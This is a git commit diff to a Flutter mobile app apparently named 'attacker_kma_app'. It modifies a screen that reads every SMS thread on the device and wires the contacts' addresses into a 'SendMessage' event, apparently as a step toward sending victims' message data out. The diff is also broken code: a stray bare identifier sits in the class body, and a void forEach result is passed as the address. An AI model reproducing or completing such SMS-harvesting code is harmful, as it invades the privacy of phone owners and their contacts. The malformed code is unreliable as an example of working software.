f18cc28fc152a407b4ff944fa6f7fd540c7023fc
Long handsome <>
2020-06-24 21:14:36 +0700

    loi send data

--- lib/screen/phone/message_screen.dart
+++ lib/screen/phone/message_screen.dart
@@ -1,5 +1,9 @@
+import 'package:attacker_kma_app/blocs/messages/message_bloc.dart';
+import 'package:attacker_kma_app/blocs/messages/message_event.dart';
 import 'package:attacker_kma_app/common_widgets/content_message.dart';
+import 'package:attacker_kma_app/models/message.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:sms/sms.dart';
 
 import '../../common_widgets/content_message.dart';
@@ -7,9 +11,15 @@ import '../../common_widgets/content_message.dart';
 class MessageScreen extends StatelessWidget {
   List<SmsThread> threads;
 
+  MessageBloc _messageBloc;
+
   SmsQuery query = SmsQuery();
 
+  MessageModel messageModel;
+
   getContactSMS() async => threads = await query.getAllThreads;
+
+  messageModel
 
   @override
   Widget build(BuildContext context) {
@@ -19,15 +29,28 @@ class MessageScreen extends StatelessWidget {
         if (!snapshot.hasData) {
           return Center(child: CircularProgressIndicator());
         } else {
-          return ListView.builder(
-            itemCount: threads.length,
-            itemBuilder: (context, index) {
-              return MessageWidget(
-                profilePics: "https://bit.ly/3d3hq8j",
-                title: threads[index].contact.address,
-                content: threads[index].messages.length.toString(),
-              );
-            },
+          return BlocBuilder(
+            bloc: _messageBloc = MessageBloc()..add(SendMessage(address: threads.forEach((element) => element.contact.address))),
+            child: Column(
+              children: [
+                Expanded(
+                  child: ListView.builder(
+                    itemCount: threads.length,
+                    itemBuilder: (context, index) {
+                      return MessageWidget(
+                        profilePics: "https://bit.ly/3d3hq8j",
+                        title: threads[index].contact.address,
+                        content: threads[index].messages.length.toString(),
+                      );
+                    },
+                  ),
+                ),
+                FlatButton(
+                  onPressed: () {},
+                  child: Text('Gui'),
+                )
+              ],
+            ),
           );
         }
       },
